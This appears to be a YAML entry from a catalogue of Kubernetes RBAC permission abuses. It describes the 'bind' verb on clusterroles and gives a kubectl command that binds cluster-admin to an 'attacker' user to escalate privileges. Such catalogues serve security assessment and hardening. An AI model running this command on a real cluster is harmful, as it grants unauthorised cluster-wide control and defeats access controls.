---
verb: "bind"
resource: "clusterroles"
description: "Bind cluster roles to users, groups, or service accounts"
abuses:
  - type: "Privilege Escalation"
    description: "Bind privileged cluster roles to controlled accounts for cluster-wide privilege escalation"
    code: |
      # Bind cluster-admin to controlled user
      kubectl create clusterrolebinding cluster-admin-escalation --clusterrole=cluster-admin --user=attacker
---